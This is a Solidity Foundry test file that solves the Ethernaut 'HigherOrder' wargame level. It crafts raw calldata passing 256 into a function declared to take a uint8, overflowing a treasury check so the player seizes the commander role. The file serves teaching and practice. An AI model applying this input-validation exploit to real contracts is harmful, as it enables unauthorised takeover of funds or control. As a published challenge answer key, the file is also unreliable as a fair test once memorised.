// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

/// Ethernaut #30 "HigherOrder" → SC05 input validation / raw calldata (no exact catalog entry).
/// `registerTreasury(uint8)` stores `calldataload(4)` directly — reading a full 32-byte word where an
/// ABI-encoded `uint8` would sit. Crafting calldata with a value > 255 sets `treasury > 255`, so
/// `claimLeadership()` makes the caller commander. Win: commander == player. (HigherOrder is 0.6.12.)
interface IHigherOrder {
    function claimLeadership() external;
    function commander() external view returns (address);
    function treasury() external view returns (uint256);
}

contract HigherOrderTest is Test {
    address player = makeAddr("player");

    function test_solve_higherorder() public {
        address ho = deployCode("HigherOrder.sol:HigherOrder");

        vm.startPrank(player);
        // selector + a full 32-byte word (256) where the uint8 arg would be
        (bool ok,) = ho.call(abi.encodePacked(bytes4(keccak256("registerTreasury(uint8)")), uint256(256)));
        require(ok, "registerTreasury failed");
        IHigherOrder(ho).claimLeadership();
        vm.stopPrank();

        assertGt(IHigherOrder(ho).treasury(), 255, "treasury overflowed past uint8 range");
        assertEq(IHigherOrder(ho).commander(), player, "player is commander");
    }
}
